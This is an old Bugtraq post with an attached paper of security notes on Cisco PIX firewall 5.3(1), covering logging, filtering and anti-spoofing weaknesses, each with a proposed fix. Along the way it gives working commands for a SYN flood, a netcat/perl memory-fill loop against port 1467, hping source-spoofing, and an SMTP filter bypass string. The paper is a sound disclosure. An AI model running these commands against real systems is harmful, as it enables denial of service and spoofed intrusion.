@@ -1,0 +1,470 @@
+From owner-bugtraq@SECURITYFOCUS.COM  Sun Mar 11 20:03:29 2001
+Date:         Fri, 9 Mar 2001 19:32:41 +0100
+Reply-To: "Fabio Pietrosanti (naif)" <naif@INET.IT>
+Sender: Bugtraq List <BUGTRAQ@SECURITYFOCUS.COM>
+From: "Fabio Pietrosanti (naif)" <naif@INET.IT>
+Subject:      Cisco PIX Security Notes
+To: BUGTRAQ@SECURITYFOCUS.COM
+
+--H1spWtNR+x+ondvy
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+
+Working with Cisco PIX Firewall i wrote some note about possible security
+problem of Cisco PIX .
+
+Attached the paper Cisco_PIX_Notes.txt :)
+
+
+--
+Pietrosanti  Fabio          I.NET SpA, High Quality Access to the Internet
+e-mail:  naif@inet.it       ( Direzione Tecnica, Security Staff )
+         firewall@inet.it
+PGP Key (DSS)               http://naif.itapac.net/naif.asc
+
+Home Page URL:            http://www.inet.it
+Sede:                     Via Darwin, 85 20019 Settimo Milanese (MI)
+Tel:                      02-328631   Fax: 02-328637701
+--
+Free advertising: www.openbsd.org - Multiplatform Ultra-secure OS
+
+
+--H1spWtNR+x+ondvy
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="Cisco_PIX_notes.txt"
+
+*********************************** Cisco PIX Notes **********************************
+
+-- Introduction
+
+This is a simples paper on which i wrote down some note about "Cisco PIX Firewall" so it isn't well
+organized or talk specifically about a vulnerability .
+
+
+All test it's about THE latest pix release on this pix:
+*****************************************
+Cisco Secure PIX Firewall Version 5.3(1)
+Hardware:   SE442, 128 MB RAM, CPU Pentium II 350 MHz
+Flash i28F640J5 @ 0x300, 16MB
+BIOS Flash AT29C257 @ 0xfffd8000, 32KB
+0:8 ethernet0: add is 00d0.b790.5685, irq 11
+1: ethernet1: address is 00e0.b601.cfbd, irq 15
+2: ethernet2: address is 00e0.b601.cfbc, irq 10
+3: ethernet3: address is 00e0.b601.cfbb, irq 9
+4: ethernet4: address is 00e0.b601.cfba, irq 11
+5: ethernet5: address is 00d0.b790.512e, irq 10
+VPN-DES:        Enabled
+VPN-3DES:       Enabled
+Throughput:     Unlimited
+*****************************************
+
+Here a snip of the configuration:
+ ****************************
+ PIX Version 5.3(1)
+ ip address outside external_pix 255.255.255.0
+ ip address naif 192.168.3.1 255.255.255.0
+ ip verify reverse-path interface naif
+ ip verify reverse-path interface outside
+ ip audit name info_naif info action alarm
+ ip audit name attack_naif attack action alarm drop
+ ip audit interface naif info_naif
+ ip audit interface naif attack_naif
+ static (naif,outside) external_spyzone 192.168.3.3 netmask 255.255.255.255 0 0    <-- No connection limit
+ access-list acl_outside permit tcp host naif_ip host external_spyzone eq www
+ access-group acl_outside in interface outside
+ access-list acl_naif permit ip any any
+ access-group acl_naif in interface naif
+ floodguard enable
+ sysopt security fragguard
+ telnet 192.168.3.3 255.255.255.255 naif
+ ssh 192.168.3.3 255.255.255.255 naif
+ *****************************
+
+I used for my test hping, nmap, synk4, telnet, tcpdump, netcat(nc) .
+
+Outside used to start attack: naif_ip ( Linux 2.4)
+Outside static nat of 192.168.3.3: external_spyzone
+Outside pix ip: external_pix
+Internal pix ip: 192.168.3.1
+Internal box ip: 192.168.3.3 ( Linux 2.2.18 )
+Another Internal box ip: 192.168.3.2 ( AIX 4.2 )
+
+
+-----------------------------------------------------------------
+-- Cisco PIX Firewall Logging Feature when firewall is probed.
+
+This is what appens when a pix was probed directly from outside world.
+note: pix is using "logging console debug"
+note: on every tcp packet to 23/tcp or 1467/tcp of the pix log: 402106: Rec'd packet not an IPSEC packet.
+
+ - Syn Scan
+   nmap -sS -F -O external_pix -T Insane
+   - Response:
+   402106: Rec'd packet not an IPSEC packet. (ip) dest_addr= external_pix, src_addr= naif_ip, prot= tcp
+
+ - UDP Scan
+   nmap -sU -T Insane external_pix
+   - Response: none
+
+ - Fin Scan
+   nmap -sF -T insane external_pix
+   - Response:
+   402106: Rec'd packet not an IPSEC packet. (ip) dest_addr= external_pix, src_addr= naif_ip, prot= tcp
+
+ - XMAS Scan
+   nmap -sX -T insane external_pix
+   - Response:
+   402106: Rec'd packet not an IPSEC packet. (ip) dest_addr= external_pix, src_addr= naif_ip, prot= tcp
+   402106: Rec'd packet not an IPSEC packet. (ip) dest_addr= external_pix, src_addr= naif_ip, prot= tcp
+
+ - NULL Scan
+   nmap -sN -T insane external_pix
+   - Response:
+   402106: Rec'd packet not an IPSEC packet. (ip) dest_addr= external_pix, src_addr= naif_ip, prot= tcp
+   402106: Rec'd packet not an IPSEC packet. (ip) dest_addr= external_pix, src_addr= naif_ip, prot= tcp
+
+ - Ack Scan
+   nmap -sA -T insane external_pix
+   - Response:
+   402106: Rec'd packet not an IPSEC packet. (ip) dest_addr= external_pix, src_addr= naif_ip, prot= tcp
+
+ - Window Scan
+   nmap -sW -T insane external_pix
+   - Response:
+   402106: Rec'd packet not an IPSEC packet. (ip) dest_addr= external_pix, src_addr= naif_ip, prot= tcp
+
+ - Syn+Fin packet
+   hping  -c 1 -S -F -p 99 external_pix
+   - Response: none
+
+ - Fragmented syn:
+   hping  -f -c 1 -S -p 99 external_pix
+   - Response
+   106020: Deny IP teardrop fragment (size = 4, offset = 16) from naif_ip to external_pix
+
+
+Logging with this release has many problem, but we tested 6.0 beta and some of other problem was resolved.
+-----------------------------------------------------------------
+--  Cisco PIX Firewall syn flood * EASY DOS WITH PIX
+
+For this testing I've installed a webserver on 192.168.3.3 statically mapped to external_spyzone.
+I used  synk4 with the 318' line of code changed from usleep(300) to usleep(10) so
+I'll send syn at a good rate [my 0,2 cents: Fabio, at which rate??. This could be interesting, do you agree?].
+
+Let's go:
+naif:/home/naif/pixdebug# ./synk4 10.10.10.10 external_spyzone 80 80
+Tada'!!! After  about 4 second external_spyzone  doesn't reply  anymore on 80/tcp port.
+
+Looking  at the pix:
+skifo-pix(config)# show conn
+307 in use, 522 most used
+
+With only 307 syn we made an efficient Syn Flood and Cisco PIX  didn't manage it and the service go down.
+
+Sure, no SYN packets are received by 192.168.3.3 due to his "tcp intercept" feature: it makes a connection
+with the internal server only after the 3way handshake and thus the connection is completed. Syn flood
+protection doesn't work .
+
+Now we have either to wait for default 5 minutes timeout  or we have to  make a clear xlate to TearDown
+all connection and cleanup the PIX Connection Table .
+
+I think that everyone with a 14.4 modem could do a successfull syn flood against
+server ''protected'' by the pix.
+
+Solution: to implement a working "tcp intercept" feature like on IOS IP/FW 12
+
+p.s. where i'm working, in past some customer was syn flooded and pix does'nt reject the attack,
+     instead a Cisco Router with IOS IP/FW/IDS with "ip tcp intercept" protect it.
+------------------------------------------------------------------
+--  Cisco PIX Memory Fill
+
+Internal users with enabled telnet may fill  completely the Cisco PIX memory sending data to
+Cisco PIX Secure Database Manager port ( 1467/tcp ) .
+Cisco PIX accept a maximum of 7 connection to csdm port so we issue from
+our linux box on internal network  with telnet enabled access :
+
+for  in `seq 7` ; do (perl -e 'while(true) { print "PIXSUX"x600 }' | nc 192.168.3.1 1467&) ; done
+
+I could verify the fill of memory connected to the console with minicom with
+the command "show mem" .
+skifo-pix(config)# show mem
+1342177h28 bytes total,45728 bytes free
+
+
+Solution: to avoid spoofing or impersonification of management console
+          use either  console only or SSH to manage PIX .
+
+------------------------------------------------------------------
+-- Cisco does not check spoofing under certain condition ( ssh port )
+For this test  I enabled ssh from outside host with:
+
+ssh naif_ip 255.255.255.255 outside
+
+For some reason PIX disable anti-spoofing check when packet
+are destinated to pix on SSH port.
+
+>From an external box i send this packet:
+naif:/home/naif# hping -S -c 1 -p 22 -a 192.168.3.2 external_pix
+
+On the internal networking using tcpdump i could see:
+01:11:59.585798 external_pix.22 > 192.168.3.2.2736: S 1862166451:1862166451(0) ack 907686624 win 4096 <mss 1024> (ttl 255, id 9049)
+
+WOW, ip  reverse-path verification doesn't work here...
+
+notes: If you enable ssh on a interface ( outside,inside or other )
+       it will bind ssh to this interface, and it will deny the connection
+       only at application level ; It means that you could open a socket
+       to ssh port ( so you could syn flood it and avoid the Firewall
+       manager to manage the pix via ssh ) .
+--------------------------------------------------------------------
+-- Cisco does not check spoofing under certain condition ( PPTP port )
+For this test I enabled pptp from outside with this configuration:
+vpdn group 1 accept dialin pptp
+vpdn group 1 ppp authentication pap
+vpdn group 1 ppp authentication chap
+vpdn group 1 ppp authentication mschap
+vpdn group 1 client configuration address local pptp_test
+vpdn group 1 client authentication local
+vpdn username ftptest password ftptest1
+vpdn enable outside
+sysopt connection permit-pptp
+
+>From an external box send this packet:
+naif:~# hping -c 1  -p 1723 -S -s 669 -a 192.168.3.2   external_pix
+
+On the internal networking using tcpdump  I  see:
+00:16:34.113812 external_pix.1723 > 192.168.3.2.669: S 804103784:804103784(0) ack 695987355 win 4096 <mss 1024> (ttl 255, id 9232)
+
+For some reason PIX disable anti-spoofing check when packet
+are destinated to pix on PPTP port.
+
+Then on the log we  will see:
+213001: PPTP control daemon socket io read error, errno = 32
+
+note: the pptp daemon of pix is also vulnerable to syn flood
+note2: It's not possible to block access to pptp server using
+       pix access-list so everyone could open a socket to pptp
+       daemon as for ssh .
+
+
+------------------------------------------------------------------
+-- Cisco PIX SMTP Fixup  not working properly
+Ok, Ok, now fixup isn't bypassable but  It will not rewrite  completely
+our command .
+
+PIX normally allow NOOP,HELO,DATA,MAIL FROM,RCPT TO, QUIT command
+but what  happens  if  I write,  as for example, "pixsux" ?
+
+The pix translate "pixsux" to XXXXXX and send it to the SMTP Server .
+and on debug console we could  see:
+        smtp_cmd: cmd = unknown entering reply mode
+        smtp: X-ing pixsux
+
+Ok, in the past we found some vulnerabilities now fixed.
+However something to fix is present yet.
+
+We could pass something that it's not only XXXXXX sending
+proibited command. When we send command such as EXPN, HELP,
+VRFY then pix rewrite correctly this command but it doesn't rewrite
+other data on the same line( which must be in the same packet ).
+
+If  I send to smtp server:
+
+helpstaceppachevola
+
+pix, instead of rewriting all XXXX, translates it to the server as
+
+XXXXstaceppachevola
+
+and on debug console we could simply see:
+        smtp_cmd: cmd = help entering reply mode
+        smtp: nullify <help> command
+
+On logging level 4 we're not notified that someone tryied to
+send proibited command.
+
+Solution I  : TO rewrite ALL not allowed character to X's
+Solution II : TO Notify on warnings log level the SMTP command attempt.
+
+
+------------------------------------------------------------------
+-- Cisco PIX doesn't check for bad checksum in ip header.
+
+While playing with hping and pix  I noticed that pix doesn't check the
+checksum of the ip header and forward the packet inside the pix .
+
+Look here, we'll send 2  packets:
+
+ * First ( with wrong checksum)
+naif:~/isic-0.05# hping -S -badcksum  -c 1 -p 25 spyzone -k -M 0 -o 0x10 -w 0 -t 0 -N 1
+eth0 default routing interface selected (according to /proc)
+HPING spyzone (eth0 external_spyzone): S set, 40 headers + 0 data bytes
+
+--- spyzone hping statistic ---
+1 packets tramitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+ * Second (with correct checksum)
+
+naif:~/isic-0.05# hping -S  -s 2154 -c 1 -p 25 spyzone -k -M 0 -o 0x10 -w 0 -t 0 -N 1
+eth0 default routing interface selected (according to /proc)
+HPING spyzone (eth0 external_spyzone): S set, 40 headers + 0 data bytes
+46 bytes from external_spyzone: flags=SA seq=0 ttl=64 id=29461 win=32696 rtt=1.6 ms
+
+--- spyzone hping statistic ---
+1 packets tramitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 1.6/1.6/1.6 ms
+
+Tcpdumping on the internal network....
+
+Packets with wrong checksum are passed:
+02:32:33.451984 naif_ip.2154 > 192.168.3.3.25: S 0:0(0) win 0 [ttl 0] (id 1)
+                         4500 0028 0001 0000 0006 1d03 d55c 04c5
+                         c0a8 0303 086a 0019 0000 0000 2a7f f1d0
+                         5002 0000 c1ed 0000 0000 0000 0000
+
+Packet with correct checksum:
+20:18:58.762430 naif_ip.2154 > 192.168.3.3.25: S 0:0(0) win 0 [ttl 0] (id 1)
+                         4500 0028 0001 0000 0006 1d03 d55c 04c5
+                         c0a8 0303 086a 0019 0000 0000 ea8d 14bf
+                         5002 0000 0a46 0000 0000 0000 0000
+20:18:58.762536 192.168.3.3.25 > naif_ip.2154: S 1324271885:1324271885(0) ack 1 win 32696 <mss 536> (DF) (ttl 64, id 29900)                         4500 002c 74cc 4000 4006 2833 c0a8 0303
+                         d55c 04c5 0019 086a 4eee c90d 0000 0001
+                         6012 7fb8 5dad 0000 0204 0218
+20:18:58.763244 naif_ip.2154 > 192.168.3.3.25: R 1:1(0) win 0 (DF) (ttl 255, id 0)
+                         4500 0028 0000 4000 ff06 de02 d55c 04c5
+                         c0a8 0303 086a 0019 0000 0001 c9bc 9c9f
+                         5004 0000 a333 0000 0000 0000 0000
+
+
+Solution: adding sanity check for ip header checksum .
+
+------------------------------------------------------------------
+-- Cisco PIX and ICMP
+
+For some stupid reason Cisco PIX with default setting  accepts icmp echo-request
+destinated to the pix from any source.
+
+You could send a maximum of an icmp echo-request fragmented into
+12  packets  having the maximum size of the media ( 1500 for ethernet ) .
+naif:/home/naif/SING-1.0# ./sing -v -echo -c 1 -s  17000 -G  external_pix -c 1
+SINGing to external_pix (external_pix): 17016 data bytes
+17016 bytes from external_pix: seq=0 ttl=255 TOS=0 time=30.298 ms
+
+--- external_pix sing statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 30.298/30.298/30.298 ms
+
+16:50:54.981719 naif_ip > external_pix: icmp: echo request (frag 13170:1480@0+) (ttl 255, len 1500)
+16:50:54.982843 naif_ip > external_pix: (frag 13170:1480@1480+) (ttl 255, len 1500)
+16:50:54.983595 naif_ip > external_pix: (frag 13170:1480@2960+) (ttl 255, len 1500)
+16:50:54.984502 naif_ip > external_pix: (frag 13170:1480@4440+) (ttl 255, len 1500)
+16:50:54.985752 naif_ip > external_pix: (frag 13170:1480@5920+) (ttl 255, len 1500)
+16:50:54.987001 naif_ip > external_pix: (frag 13170:1480@7400+) (ttl 255, len 1500)
+16:50:54.988254 naif_ip > external_pix: (frag 13170:1480@8880+) (ttl 255, len 1500)
+16:50:54.989505 naif_ip > external_pix: (frag 13170:1480@10360+) (ttl 255, len 1500)
+16:50:54.990751 naif_ip > external_pix: (frag 13170:1480@11840+) (ttl 255, len 1500)
+16:50:54.991997 naif_ip > external_pix: (frag 13170:1480@13320+) (ttl 255, len 1500)
+16:50:54.993243 naif_ip > external_pix: (frag 13170:1480@14800+) (ttl 255, len 1500)
+16:50:54.994491 naif_ip > external_pix: (frag 13170:736@16280) (ttl 255, len 756)
+16:50:54.998548 external_pix > naif_ip: icmp: echo reply (frag 9141:1480@0+) (ttl 255, len 1500)
+16:50:54.999775 external_pix > naif_ip: (frag 9141:1480@1480+) (ttl 255, len 1500)
+16:50:55.001011 external_pix > naif_ip: (frag 9141:1480@2960+) (ttl 255, len 1500)
+16:50:55.002238 external_pix > naif_ip: (frag 9141:1480@4440+) (ttl 255, len 1500)
+16:50:55.003485 external_pix > naif_ip: (frag 9141:1480@5920+) (ttl 255, len 1500)
+16:50:55.004710 external_pix > naif_ip: (frag 9141:1480@7400+) (ttl 255, len 1500)
+16:50:55.005945 external_pix > naif_ip: (frag 9141:1480@8880+) (ttl 255, len 1500)
+16:50:55.007164 external_pix > naif_ip: (frag 9141:1480@10360+) (ttl 255, len 1500)
+16:50:55.008407 external_pix > naif_ip: (frag 9141:1480@11840+) (ttl 255, len 1500)
+16:50:55.009632 external_pix > naif_ip: (frag 9141:1480@13320+) (ttl 255, len 1500)
+16:50:55.010878 external_pix > naif_ip: (frag 9141:1480@14800+) (ttl 255, len 1500)
+16:50:55.011395 external_pix > naif_ip: (frag 9141:736@16280) (ttl 255, len 756)
+
+Every icmp packet forwarded by the pix  will  always use "ttl 255".
+
+It will not echo TOS.
+It will not echo DF.
+It will not echo Unused Bit.
+
+Using access-list you cannot deny icmp destinated to the Firewall.
+
+Solution: to deny icmp using "icmp deny any 8 outside" so it will apply globally to the interface .
+
+
+
+--------------------------------------------------------------
+--- Cisco PIX Firewall Semantic Problem
+
+This is an article about how you could apply filter on the pix and
+we talk about pix common misconfiguration.
+
+ * Semantic Problem
+
+First of all, you know that a Firewall , for security reasons,  needs
+filter should be applied for packet flowing  in and out on each interface,  ok?
+With Cisco IOS you can do it, with Checkpoint you can do it, with ipchains/netfilter/ipfilter/ipfw you
+can do it, with Sonicwall you can do it!! And with PIX? no, with pix you cannot have different
+access-lists for different  interfaces, for different traffic ( in, out ) !
+
+Old pix  uses a stupid concept of outbound/conduit, but now since 5.1(1) we could use
+access-list .
+Sure, access-list it's better than conduit/outbound but you cannot use it, as on
+IOS, bye  appliying different acl's  on a interface, one for input packet, and one for output packet .
+
+When you apply an access-list to interface outside, it matches  packets coming in.
+When you apply an access-list to other  interfaces ( inside, dmz, etc ) , it matches
+only  packets coming out from the interface .
+
+  * Common Misconfiguration
+
+You know the "security level" of pix, for which every interface with higher security level
+is allowed to communicate with lower security level and if a box on a interface with lower security level
+wish to communicate with highest security level you need to put a "static" .
+
+Ok, think about this situation:
+Web server in the DMZ ( security level 50 )
+Database in the Inside ( security level 100 )
+
+>From dmz all it's allowed going to internet
+with access-list acl_dmz permit ip any any .
+
+There are  these  configurations.
+: we want our webserver it's visible on the internet
+static (dmz,outside) external-web-server-ip web-server-dmz-ip  netmask 255.255.255.255 0 0
+: we want our database it's visible from dmz
+static (inside,dmz ) internal-ip-of-db internal-ip-of-db netmask 255.255.255.255 0 0
+
+: permission from internet to  the web server  ( remember how acl's  works on pix )
+access-list acl_outside permit tcp any host  external-web-server-ip eq 80
+access-group acl_outside in interface outside
+: permission From dmz to internet ( full access )
+access-list acl_dmz permit ip any any
+access-group acl_dmz in interface dmz
+: permission From inside to internet and dmz ( full access )
+access-list acl_inside permit ip any any
+access-group acl_inside in interface inside
+
+
+I see many pix with this kind of configuration, just few ppl apply rules for packet
+coming out from the interface or simply doesn't apply  them  ( so everything it's permitted ) .
+The problem  arises in the static  inside-dmz  because the static  bypasses the PIX security level,
+so every host on the dmz is allowed to connect in full-ip to internal-ip-of-db,  unless you have
+an explicit deny .
+
+Solution: to avoid using the keyword "any" on acl_dmz or lower
+          security level. The corerct syntax to be used is to put an
+          before explicit "deny"  for the network presented as static.
+
+
+
+my 2 cents
+
+
+Fabio Pietrosanti ( naif )
+naif@sikurezza.org
+naif@Undernet #sikurezza
+Thanks to vodka for her support :*
+
+--H1spWtNR+x+ondvy--
+
